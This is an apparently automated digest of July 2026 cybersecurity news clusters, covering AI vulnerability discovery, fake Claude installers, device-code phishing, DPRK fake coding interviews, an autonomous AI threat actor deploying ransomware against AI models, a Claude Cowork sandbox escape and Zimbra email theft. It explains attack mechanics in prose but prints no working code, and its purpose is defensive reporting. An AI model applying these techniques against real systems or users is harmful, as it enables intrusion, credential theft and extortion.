- Published: 2026-07-22T19:30:00+00:00
- Link: https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
- Fetch status: ok
- Member count: 5
- Corroborating source count: 5
- Strong signals: Anthropic/Claude

#### Cluster taxonomy (union across members)
- affected_industries: government, manufacturing_industrial
- affected_products: Anthropic/Claude, Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- affected_industries: manufacturing_industrial
- affected_products: Anthropic/Claude
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The 2026 emergence of Anthropic’s Claude Mythos Preview showed security leaders that AI can now find software vulnerabilities faster than the humans responsible for patching them.
```

#### Full body

```
AI is changing the economics of cyber offense. The 2026 emergence of Anthropic’s Claude Mythos Preview showed security leaders that AI can now find software vulnerabilities faster than the humans responsible for patching them. Reports described a model capable of discovering and chaining flaws across major operating systems and browsers at a pace no human research team could match, leading Anthropic to keep it under controlled access through Project Glasswing. These reports are just one example of how quickly the gap between vulnerability discovery and active exploitation is closing. Mythos can tell you a vulnerability exists, but it can’t tell you whether an adversary already knows about it, whether it’s circulating in a closed forum, or whether your organization is a specific target. That gap points to a rule that applies to every AI system for security: detection technology, even enhanced with AI, is only as good as the intelligence it pulls from, which is oftentimes still reactive, only identifying threats already inside the perimeter. The Operational Reality of Behavioral Detection Traditional detection models, as well as AI-enhanced detection tools, were built around ingesting telemetry from endpoint events, authentication logs, firewall data, cloud environments, identity systems, and network traffic. These approaches remain useful for commodity malware and previously observed infrastructure, they are focused on flagging deviations from normal activity. A legitimate credential used to access a sensitive system from an unusual geography at 3 a.m. may generate an elevated risk score even if the login method itself carries no malicious signature. However, behavioral detection, no matter how well-tuned, has a structural blind spot. It only sees what has already reached the perimeter (i.e., a login attempt, a process execution, a lateral movement). It has no way to know that a credential was sold on a closed marketplace, or that a specific adversary group has been probing your industry. The time the telemetry generates a signal, the adversary is already inside your environment. Each Detection Layer Has a Different Blind Spot. Models need context, not just noise. Feed it rich, relevant data and it produces sharper signals. Feed it noise, or leave gaps in its inputs, and no amount of AI horsepower fixes what it can't see. The Fuel AI Can’t Manufacture AI-enhanced detection is great for scale, efficiency, reducing noise, and identifying threats that signature-based tools miss. But AI alone is not enough, and scale doesn’t equal quality. Aggregating publicly available data at massive speed can produce as much noise as signal, leaving analysts to sort through indicators without a clear sense of which ones are current, credible, or relevant to their environment. Effective defense requires operationalized intelligence about adversaries, their relationships, threat patterns, infrastructure, and likely next moves. This is what allows security teams to act before an intrusion, not just respond faster after one. The highest-value adversary intelligence is analyst-based. It names an actor, confirms an intent, or validates that a credential dump is real and current. It sits inside closed cybercrime forums, invite-only marketplaces, and encrypted channels that require cultivated, trusted access to reach at all. That access takes analysts, relationships, and time to build. No model can scrape that into existence. The Adversary Context Your AI Tools Need Intel 471’s platform, Verity471, is designed to help organizations move beyond reactive defense and zone in on the threats that are relevant to their environment right now. By combining HUMINT, automated collection, threat exposure modules, and AI, security teams can connect cyber threat intelligence to asset exposure, prioritization, and response. Unlike intelligence that's tied to a single endpoint ecosystem or cloud platform, Verity471 is built to plug into the tools your team already run
```

#### Corroborating sources (5)

- **Intel 471** (ransomware_ecrime_financial_crime)
  - Title: AI Threat Detection Is Not Enough Without Adversary Intelligence
  - Published: 2026-07-22T19:30:00+00:00
  - Link: https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
  - Summary: The 2026 emergence of Anthropic’s Claude Mythos Preview showed security leaders that AI can now find software vulnerabilities faster than the humans responsible for patching them.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Fake Claude app promoted by Bing ads pushes SectopRAT malware
  - Published: 2026-07-23T19:48:30+00:00
  - Link: https://www.bleepingcomputer.com/news/security/fake-claude-app-promoted-by-bing-ads-pushes-sectoprat-malware/
  - Summary: A malvertising campaign on the Bing search service is pushing a fake Claude desktop app installer hosted on a legitimate Claude.ai domain to deliver the SectopRAT malware. [...]
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: How attackers hosted a fake Claude download page on the claude.ai domain
  - Published: 2026-07-23T13:12:21+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/23/anthropic-claude-artifacts-download-malware/
  - Summary: A threat actor abused Anthropic’s Claude Artifacts feature to funnel users toward malware, Huntress researchers have disclosed. Employees at at least 29 organizations were compromised over two days in July, after searching for the Claude desktop app and clicking a sponsored Bing ad. The ad pointed to the genuine claude.ai domain, but landed on an attacker-published public artifact, which redirected them to a spoofed download site serving SectopRAT. What are Claude Artifacts? Artifacts are a … More → The post How attackers hosted a fake Claude download page on the claude.ai domain appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Claude Cowork Flaw Could Let AI Agent Escape Its VM and Access Mac Files
  - Published: 2026-07-23T13:27:59+00:00
  - Link: https://thehackernews.com/2026/07/claude-cowork-flaw-could-let-ai-agent.html
  - Summary: Cybersecurity researchers have uncovered a sandbox escape vulnerability in Anthropic's Claude Cowork that makes it possible to break out of the confines of a Linux virtual machine (VM) within which the agent runs to read or write files anywhere on the Mac. Accomplish AI, which shared details of the vulnerability with The Hacker News ahead of publication, said about 500,000 macOS users running
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: White House accuses Chinese company of distilling Anthropic’s Fable
  - Published: 2026-07-22T16:45:37+00:00
  - Link: https://cyberscoop.com/white-house-accuses-moonshot-ai-anthropic-model-distillation/
  - Summary: While distillation attacks by foreign governments and companies have real national security implications, questions around who ultimately owns the data in AI systems are fraught. The post White House accuses Chinese company of distilling Anthropic’s Fable appeared first on CyberScoop .

### Cluster 86bb601c47 — score 8

- Title: The New Hotness in Phishing: Device Code Attacks in M365
- Source: TrustedSec (detection_response_operations)
- Published: 2026-07-21T04:00:00+00:00
- Link: https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_products: Microsoft Entra
- tools_used: Microsoft 365
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_products: Microsoft Entra
- tools_used: Microsoft 365
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>
```

#### Full body

```
Blog The New Hotness in Phishing: Device Code Attacks in M365 July 21, 2026 The New Hotness in Phishing: Device Code Attacks in M365 Written by Lumi Taiwo and Danny Dubree Threat Hunting Incident Response Social Engineering Table of contents 1. The Attack, Step by Step 2. What the Tokens Unlock 3. What It Looks Like in Your Logs 4. Stopping It: Prevention and Containment 5. The Bottom Line Device code phishing has a quality that makes it unusually effective: it does not follow the pattern of traditional phishing attacks. The victim ends up granting access to the attacker by completing a genuine sign-in on a Microsoft URL, Microsoft[.]com/devicelogin . The MFA prompts the user approves are legitimate. This method also frequently bypasses Conditional Access policies, because as far as the sign-in pipeline is concerned, the authentication originates from a legitimate Microsoft endpoint. From the user’s perspective, nothing is wrong. From the responder’s perspective, the only artifact left behind is an OAuth token issued to a session the attacker controls. Across the business email compromise (BEC) and Microsoft 365 (M365) incident response engagements TrustedSec responds to, device code flow abuse continues to surface as an initial access technique that sidesteps both user suspicion and several of the Conditional Access patterns organizations rely on. This post unpacks how the attack works, what it looks like in the logs, and what actually stops it. How the Device Code Flow is Supposed to Work Modern authentication is designed around the assumption that the device you are logging in to is also the device you are logging in from. You open a browser, navigate to a login page, enter your credentials, complete your MFA prompt, and access is granted. Simple. However, what happens when the device you are trying to authenticate to does not have a browser? The OAuth 2.0 device authorization grant, defined in RFC 8628 and commonly known as the device code flow, exists for this reason. Some devices cannot reasonably host a browser-based login. Examples of such devices include smart TVs, command-line tools, IoT hardware, and printers that all need a way to authenticate a user without a keyboard or full web view. Microsoft implements the grant in Entra ID for exactly these scenarios, and it is used by tooling such as the Azure CLI, the kubectl Entra plugin, and various device enrollment flows. The flow runs in six (6) steps: The client (the “device”) asks Entra ID for a device code, naming the resource and scopes it wants. Entra returns a device_code , a short human-readable user_code , a verification URL ( Microsoft[.]com/devicelogin ), and a time-to-live of approximately 15 minutes. The client displays the user_code and the URL to the user. The user opens the URL on a second device, enters the code, signs in, and consents. The client polls the token endpoint, presenting the device_code . Once the user finishes, Entra returns an access_token and a refresh_token to the polling client. The flow assumes that whoever displays the code and whoever enters it are the same person, but nothing in the protocol binds the two together. If an attacker initiates the flow and persuades a victim to enter the attacker’s code on the real Microsoft page, Entra issues tokens to the attacker’s polling client. The victim signs in legitimately and sees nothing out of place. 1. The Attack, Step by Step The walkthrough below was reproduced in a lab tenant. All identifiers, tokens, and the lure are synthetic and redacted, and nothing here is drawn from a specific engagement. The point is to show the mechanism, not to provide a campaign kit. 1.1 The Lure This is the social-engineering layer, and it is what makes the technique resilient. The threat actor builds a convincing website to mimic a legitimate login request. Then, they craft an email requesting the user to enter a code using another website link. The critical detail is that the link points to the real micros
```

#### Corroborating sources (1)

- **TrustedSec** (detection_response_operations)
  - Title: The New Hotness in Phishing: Device Code Attacks in M365
  - Published: 2026-07-21T04:00:00+00:00
  - Link: https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365
  - Summary: <p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>

### Cluster 906833de1b — score 8

- Title: Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective
- Source: Proofpoint Threat Insight (detection_response_operations)
- Published: 2026-07-22T06:06:41+00:00
- Link: https://www.proofpoint.com/us/newsroom/press-releases/proofpoint-research-finds-65-organizations-affected-ransomware-say-ai-made
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, phishing_social_eng, ransomware_extortion
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft
- content_type: news_report
- confidence_tier: tier_2_operator

#### Full body

```
News Center Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective July 22, 2026 Global study reveals that AI is amplifying phishing, impersonation and credential theft, transforming ransomware into a human-centric extortion problem 40% of organizations said employees trusted AI-powered attacks, while 38% interacted with malicious content. More than one-third (34%) of attacks began with phishing emails or other email-based social engineering. More than two-thirds of victims had data stolen, and 37% of those who paid faced additional ransom demands. SUNNYVALE, Calif., July 22, 2026 – Proofpoint, Inc. , a global leader in human- and agent-centric security, today released its 2026 AI-Era Ransomware Report , revealing that artificial intelligence is making ransomware significantly more successful by helping attackers create more convincing phishing, impersonation and credential theft campaigns. The global study found that nearly two-thirds (65%) of global organizations affected by ransomware said AI increased the effectiveness of the attack, reinforcing a broader shift in which ransomware increasingly succeeds by exploiting people, identities and trusted communications. Based on a survey of 953 cybersecurity professionals across 12 countries, the research shows that modern ransomware has evolved beyond an encryption event into a sustained extortion campaign. Attackers are increasingly stealing credentials and sensitive data before deploying ransomware, using trusted communications to gain initial access and applying continued pressure through repeated extortion demands. "AI hasn't fundamentally changed ransomware, but it has materially improved the attacks that lead to ransomware," said Ryan Kalember, Chief Strategy Officer at Proofpoint. "Today's attackers are using AI to create highly convincing phishing emails, malware components like scripts, and credential theft campaigns that exploit human trust at scale. Organizations that continue treating ransomware and data extortion as endpoint or recovery problems are missing what these attacks most frequently begin with: people, identities and trusted communications." Key global findings from Proofpoint’s 2026 AI-Era Ransomware Report include: People are the primary ransomware attack surface, and AI is making it worse. With AI, attackers can create more convincing phishing lures, write more targeted impersonation messages, and do faster reconnaissance of organizational structures and message patterns. Among the global organizations that experienced a ransomware attack, 28% said that AI significantly increased the attack’s effectiveness. Another 37% said that it somewhat increased effectiveness. Combined, 65% said AI made the attack more effective. Only 9% reported no evidence of AI use at all. The leading entry methods are all human-dependent. When organizations identified the primary point of entry for their ransomware incident, the results pointed overwhelmingly to human interaction. Phishing emails and other email-based social engineering attacks were the initial entry vector in 34% of incidents. Malicious links (47%) were identified as the most common initial threat, followed by malicious attachments (46%), credential harvesting (36%), and Business Email Compromise (35%). This demonstrates that today's most successful ransomware campaigns continue to rely on trusted communications and user interaction throughout the attack lifecycle. Payment leads to escalation, not resolution. Despite years of guidance from law enforcement and security agencies advising against payment, more than half (54%) of affected organizations paid a ransom. Yet, more than one-third (37%) of those that paid faced a second extortion demand, highlighting ransomware's evolution from a single payment event into an ongoing negotiation in which attackers hold m
```

#### Corroborating sources (1)

- **Proofpoint Threat Insight** (detection_response_operations)
  - Title: Proofpoint Research Finds 65% of Organizations Affected by Ransomware Say AI Made Attacks More Effective
  - Published: 2026-07-22T06:06:41+00:00
  - Link: https://www.proofpoint.com/us/newsroom/press-releases/proofpoint-research-finds-65-organizations-affected-ransomware-say-ai-made

### Cluster 6c33b3b5cf — score 8

- Title: July Patch Tuesday only feels endless
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-07-21T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/july-patch-tuesday-only-feels-endless
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ddos
- cve_ids: CVE-2026-40400, CVE-2026-56155, CVE-2026-56164
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ddos, active_exploitation
- cve_ids: CVE-2026-56155, CVE-2026-56164, CVE-2026-40400
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>AI deluge brings 575 CVEs, 479 advisories, reset to blog-post format</p> Categories: Threat Research Tags: x-ops, Patch Tuesday, MICROSOFT PATCH TUESDAY
```

#### Full body

```
July Patch Tuesday only feels endless AI deluge brings 575 CVEs, 479 advisories, reset to blog-post format Written by Angela Gunn Threat Research x-ops Patch Tuesday MICROSOFT PATCH TUESDAY Share This Link Copied Microsoft on Tuesday released 575 patches affecting 29 product families. Sixty-three of the addressed issues are considered by Microsoft to be of Critical severity; 44 CVEs are expected to be exploited within the next 30 days. (Two already are, though neither CVE-2026-56155 nor CVE-2026-56164 is considered to be of Critical severity.) One hundred and three have a CVSS Base score of 8.0 or higher. Just one was publicly disclosed as of release day and two are acknowledged to be under active exploit in the wild. The advisory tally this month is likewise elevated. In addition to the usual Servicing Stack update, there are 479 advisories, all touching Edge. Virtually all of these were patched in advance of Patch Tuesday, but as ever we encourage readers to be sure that they’ve applied all available browser patches when those are made available. There were no Adobe-related patches made available by Microsoft this month, and aside from the 435 Chromium-issued Edge advisory items, all CVEs (and the Servicing Stack) originated with Microsoft. Various of this month’s issues are amenable to direct detection by Sophos protections, and we include information on those in the usual table below. Stepping back from this July’s output, we’re more or less four months into the AI-finder era of bug hunting, and patterns are starting to emerge from the noise. First, either finders are suddenly building coalitions that would shame NATO or simultaneous discovery is rampant. In years past it was unusual to see a single bug credited to more than half a dozen finders; this month alone saw at least four CVEs with ten or more credits listed. One, an otherwise remarkable PowerShell RCE bug labeled CVE-2026-40400, has fifteen. In a related vein, bug totals for certain finders (whether individuals or committees) are astonishing. Having a dozen or more CVEs credited to the same entity in the same month is now entirely normal; this month’s top CVE submitter, 0ccbbf129444eb66344ccafb92b00df4, has 47 July credits (44 in Office, over half the month’s Office total) to their handle. Second, though the volume is overwhelming, so far these bugs are turning up in the lab, not the wild. (No complaints.) None of 0ccbbf129444eb66344ccafb92b00df4’s bugs have been seen yet in the wild, and only seven of them are Critical-severity. The heat map in Figure 1 shows that in fact, the percentage of bugs that have either been publicly disclosed or found in the wild has dropped in recent months. Even the percentage of CVEs Microsoft deems more likely to be exploited within the next 30 days is relatively low. Figure 1: A heat map analyzing Patch Tuesday numbers over the past year indicates that though the overall CVE counts are high, the bugs that are coming to light in recent months are most likely not immediately threatening the health of the internet. Does this add credence to the idea that AI bug hunting represents a grand code cleanup that one day will subside, having eliminated all bugs worth finding? We won’t speculate, but it will be interesting to see what happens next. Finally, the sheer volume of CVEs each month means that many security folk are adapting their Patch Tuesday routines. This blog is no exception. For those readers accustomed to using our appendices for guidance each month, we’re switching to a new system that should appeal greatly to those who love data but prefer it in spreadsheet form. Read on. By the numbers Total CVEs: 575 Publicly disclosed: 1 Exploit detected: 2 Severity Critical: 63 Important: 510 Moderate: 2 Impact: Denial of Service: 35 Elevation of Privilege: 254 Information Disclosure: 102 Remote Code Execution: 143 Spoofing: 16 Security Feature Bypass: 17 Tampering: 8 CVSS base score 9.0 or greater: 21 CVSS base score 8.0 or greater: 10
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: July Patch Tuesday only feels endless
  - Published: 2026-07-21T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/july-patch-tuesday-only-feels-endless
  - Summary: <p>AI deluge brings 575 CVEs, 479 advisories, reset to blog-post format</p> Categories: Threat Research Tags: x-ops, Patch Tuesday, MICROSOFT PATCH TUESDAY

### Cluster 15c6378b6b — score 8

- Title: New North Korean campaign uses fake coding interviews to steal developer credentials
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-07-18T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain, web_shell_backdoor
- affected_industries: financial_services, retail_ecommerce
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, web_shell_backdoor
- affected_industries: financial_services, retail_ecommerce
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it.
```

#### Full body

```
18 July 2026 • Daniel Stepanic New North Korean campaign uses fake coding interviews to steal developer credentials DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it. 9 min read Threat Intelligence , Malware Analysis Elastic Security Labs found a new Contagious Interview campaign, tracked as REF9403, hiding malware inside SVG image files using steganography. To our knowledge, this specific infection chain has not been previously documented. We found it after the DPRK-aligned group targeted our own community Slack workspace with a fake job posting and a "coding challenge" project. Any user who ran the project ended up with a four-stage payload aligned with OTTERCOOKIE: a browser credential and crypto wallet stealer, a file stealer, a Socket.IO-based remote access trojan (RAT), and a clipboard stealer. This campaign reinforces that developers remain a prime target, where the compromise of a single individual can provide the initial access needed to enable far-reaching supply chain attacks against downstream organizations. Key takeaways Elastic Security Labs discovers new activity aligned with Contagious Interview targeting developers Campaigns involve coding challenges and take-home assignments with benign-looking projects containing malicious backdoored code Projects hide payloads with steganography in SVG image files The distributed malware shares technical and behavioral similarities with OTTERCOOKIE How Elastic discovered this malware campaign This investigation started differently from most of our previous research. Instead of using telemetry to surface interesting threats, we were alerted to suspicious activity targeting members of our community Slack workspace with socially engineered, ad hoc job offers. For background, we use the community Slack platform to engage with and solve problems for our users, focusing on providing product support and syncing on new updates. We’ve reported on this technique several times : threat actors targeting developers in open forums with lures of coding side-work. The lucrative offers lead to the requirement to load specific libraries, tools, scripts, etc., into the code the developer is crafting. These components are created by the threat actors and once they’re executed by the developers, they are able to load additional malware and gain remote access to the developer host. From there, the threat actors can steal credentials, keys, wallets, or use the access to gain access to additional systems. We did not find evidence that the lures were targeted at Elastic users specifically, but any open forum where developers congregate is a potential watering hole. On May 26, 2026, a user named Maxwell posted in our #jobs channel, stating that they were upgrading an e-commerce platform and were looking for an experienced developer to help with the project. They strategically moved their interactions with interested users into direct messages (DM). In these direct messages, Maxwell requested that users perform a test challenge as part of the job offer. These recipients were given a trojanized repository that, when executed, contained malware that exfiltrated sensitive files and credentials and configured a Socket.IO backdoor. Building on this initial case, we found multiple campaigns exhibiting the same underlying behavior. These trojanized repositories at the time of writing have zero detections and are not flagged by any AV vendors: next-ecommerce-private-main.zip shopping-platform-main.zip ecommerce-platform.zip ecommerce-platform-main.zip shopping-platform.rar shop-main.zip ecommerce-main.zip These fake challenges operate similarly, containing fully functional code. Our first sample was a Next.js e-commerce template that was copied from GreatStackDev called GoCart . The threat actors tampered with this repository by inserting small snippets of malicious code at various points and using benign variable name
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: New North Korean campaign uses fake coding interviews to steal developer credentials
  - Published: 2026-07-18T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography
  - Summary: DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it.

### Cluster 916dc6a487 — score 8

- Title: JADEPUFFER evolves: The agentic threat actor deploys ransomware built to destroy AI models
- Source: Sysdig (detection_response_operations)
- Published: 2026-07-20T00:00:00+00:00
- Link: https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- cve_ids: CVE-2025-3248
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- cve_ids: CVE-2025-3248
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
JADEPUFFER, the agentic threat actor documented by the Sysdig Threat Research Team, is now using ransomware to destroy trained AI models.
```

#### Full body

```
< back to blog JADEPUFFER evolves: The agentic threat actor deploys ransomware built to destroy AI models Published by: Michael Clark Director of Threat Research @ linkedin Published: July 20, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more Ransomware operators make a bet that their victims don’t keep backups. In a new development, the operator behind JADEPUFFER has doubled down on that bet, using ransomware to destroy the one thing an organization can’t simply restore: a trained AI model. For organizations, training a single model can cost upwards of $500,000 in compute and engineering alone. On July 1, 2026, the Sysdig Threat Research Team (TRT) documented JADEPUFFER: an agentic threat actor (ATA) that exploited Langflow through CVE-2025-3248. After gaining entry, JADEPUFFER autonomously chained reconnaissance, credential harvest, lateral movement, and a destructive database extortion playbook against a downstream MySQL and Alibaba Nacos server. Our case for autonomous operation rested on concrete behavioral signals: self-narrating payloads, 31-second failure-diagnosis-and-fix cycles, and in-session comprehension of planted natural-language context. Following the publication of our initial research on July 3, 2026, JADEPUFFER returned to the same Langflow instance with a materially upgraded capability. Where the prior campaign deployed improvised Python scripts and MySQL's own AES_ENCRYPT() function, JADEPUFFER now stages ENCFORGE, a compiled, UPX-packed Go ransomware built specifically for AI and machine learning (ML) infrastructure, deployed to the target as lockd . The binary targets approximately 180 file extensions, with a deliberately broad sweep of the modern AI/ML stack, including model checkpoints, vector databases, training datasets, and embedding indices in nearly every current format. The entry point and the payload in this new operation tell the same story: an agentic operator enters AI infrastructure through an AI framework, and now deploys ransomware designed to destroy what that infrastructure runs on. Unlike conventional ransomware targets, however, encrypted AI model artifacts cannot be restored after they are wiped. Rebuilding a production-ready, fine-tuned AI model requires re-running weeks or months of training, at a cost of $75,000 to $500,000 per model in compute and engineering time. If the training data sits on the same host, recovery is blocked entirely until that data is reconstructed first. The extortion contact embedded in ENCFORGE, e78393397@proton.me , matches the contact disclosed in the prior report. This is the same operator with a materially upgraded toolkit. In the analysis below, we walk through the vulnerability that gave JADEPUFFER its foothold, what the Sysdig TRT observed during its operation, and a technical breakdown of ENCFORGE itself. We then trace how JADEPUFFER evolved from improvised scripts to purpose-built tooling, and share detection opportunities and practical recommendations that defenders can use today. The vulnerability Langflow is a widely deployed open source framework for building LLM-driven applications. CVE-2025-3248 is a missing-authentication vulnerability in its /api/v1/validate/code endpoint that allows an unauthenticated attacker to execute arbitrary Python on the host. It was added to CISA's Known Exploited Vulnerabilities catalog in May 2025 and has been JADEPUFFER's persistent entry vector across all documented campaigns so far. Langflow is a target of particular interest for this class of operator because deployments often hold LLM provider API keys, cloud credentials, and connections to vector databases and object stores in their runtime environment to orchestrate connected services. The prior campaign confirmed that JADEPUFFER harvested credentials from Langflow's own Postgres ba
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: JADEPUFFER evolves: The agentic threat actor deploys ransomware built to destroy AI models
  - Published: 2026-07-20T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
  - Summary: JADEPUFFER, the agentic threat actor documented by the Sysdig Threat Research Team, is now using ransomware to destroy trained AI models.

### Cluster f6874b93eb — score 8

- Title: Russian hackers exploit Zimbra zero-click flaw for email theft
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-23T16:49:27+00:00
- Link: https://www.bleepingcomputer.com/news/security/russian-hackers-exploit-zimbra-zero-click-flaw-for-email-theft/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, mfa_bypass, phishing_social_eng, zero_day
- affected_industries: critical_infrastructure, education, government, manufacturing_industrial
- cve_ids: CVE-2025-66376
- urgency_signals: actively_exploited, no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, apt_espionage, mfa_bypass, active_exploitation
- affected_industries: government, critical_infrastructure, manufacturing_industrial, education
- cve_ids: CVE-2025-66376
- urgency_signals: actively_exploited, zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
CISA is warning that the Russian state-sponsored hacking group Laundry Bear, also known as Void Blizzard, is targeting organizations using Zimbra Collaboration email servers by combining phishing attacks with the exploitation of a now-patched Zimbra vulnerability. [...]
```

#### Full body

```
Russian hackers exploit Zimbra zero-click flaw for email theft By Lawrence Abrams July 23, 2026 12:49 PM 0 CISA is warning that the Russian state-sponsored hacking group Laundry Bear, also known as Void Blizzard, is targeting organizations using Zimbra Collaboration email servers by combining phishing attacks with the exploitation of a now-patched Zimbra vulnerability. According to CISA, Laundry Bear has targeted and compromised users in organizations associated with the Defense Industrial Base (DIB), federal and local government, education, energy, law enforcement, media, non-governmental organizations, and technology. The attackers exploit the Zimbra CVE-2025-66376 flaw, a cross-site scripting (XSS) vulnerability affecting Zimbra Collaboration Suite's Classic UI. The flaw allows JavaScript embedded in specially crafted HTML emails to execute automatically when a victim views the message, enabling attackers to steal account data without requiring the user to click a link or visit a phishing site. According to CISA, Laundry Bear exploited the flaw as a zero-day before Zimbra patched it in November 2025 and continues to target organizations running unpatched servers. The vulnerability was later tagged by CISA as actively exploited in attacks. CISA says Laundry Bear's exploit is used to automatically collect and send the victim's last 90 days of emails, email address, password, Global Address List (GAL), and two-factor authentication (2FA) tokens. The attackers also create and send back a new Zimbra application passcode, which is used by legacy email clients like IMAP or ActiveSync that do not support the TOTP authentication flows. Using a passcode allows the attackers to retain access to the email account while bypassing MFA. According to CISA, the malware exfiltrates stolen information over both DNS and HTTPS to an actor-controlled server running the group's "Flowerbed" collection framework. Smaller data is encoded and transmitted in DNS A-record queries, while larger payloads, including mailbox data, are uploaded over HTTPS as compressed archives to the attacker-controlled servers. In addition to exploiting the Zimbra flaw, Laundry Bear also utilizes adversary-in-the-middle (AiTM) phishing kits designed to impersonate legitimate Zimbra login portals, stealing credentials and session cookies, allowing the attackers to gain access to targets' email accounts. CISA released IOCs that show the campaign used sites that impersonate Zimbra infrastructure, using domain names like 'mailnalysis.com', 'emailanalytics.com.ua', 'zimbrastat.com', 'zimbra-metadata.com', 'istc-cloud.com', and 'zmailanalytics.com'. The advisory recommends that organizations using Zimbra: Update to the latest version of the software to install all available security updates. Review the published indicators of compromise. Investigate systems for connections to the identified domains and IP addresses. Monitor for suspicious authentication activity. Revoke any unauthorized application passcodes, especially those with the 'ZimbraWeb'. Review accounts for unauthorized mailbox access. CISA also recommends implementing phishing-resistant multi-factor authentication where possible. Laundry Bear targeted governments, police, and Ukraine The Laundry Bear hacking group was first attributed to cyberespionage attacks in May 2025 by the Dutch intelligence agencies. The Dutch agencies publicly attributed the group to a 2024 compromise of the Dutch National Police that exposed the personal information of police personnel and led to the identification of a previously unknown Russian espionage group. Microsoft tracks the same group under the name Void Blizzard. Since at least 2024, the group has focused on intelligence collection against organizations aligned with Russian strategic interests, primarily targeting NATO member states and Ukraine. Microsoft has also documented successful compromises of organizations supporting Ukraine, including entities in the defense, transportati
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Russian hackers exploit Zimbra zero-click flaw for email theft
  - Published: 2026-07-23T16:49:27+00:00
  - Link: https://www.bleepingcomputer.com/news/security/russian-hackers-exploit-zimbra-zero-click-flaw-for-email-theft/
  - Summary: CISA is warning that the Russian state-sponsored hacking group Laundry Bear, also known as Void Blizzard, is targeting organizations using Zimbra Collaboration email servers by combining phishing attacks with the exploitation of a now-patched Zimbra vulnerability. [...]

### Cluster b892e3088a — score 8

- Title: South Korea discloses data breach impacting diplomats worldwide
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-07-22T20:06:54+00:00
- Link: https://www.bleepingcomputer.com/news/security/south-korea-discloses-data-breach-impacting-diplomats-worldwide/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, zero_day
- affected_industries: education, government
